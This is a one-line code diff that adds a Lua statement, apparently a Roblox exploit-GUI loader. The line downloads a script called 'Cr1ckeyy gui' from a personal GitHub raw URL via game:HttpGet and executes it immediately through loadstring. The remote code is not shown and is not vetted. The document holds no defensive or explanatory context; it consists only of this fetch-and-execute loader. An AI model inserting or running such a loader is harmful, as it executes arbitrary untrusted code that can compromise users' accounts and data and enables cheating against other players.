@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Logicmp4/Lua_test/main/Cr1ckeyy%20gui"))()
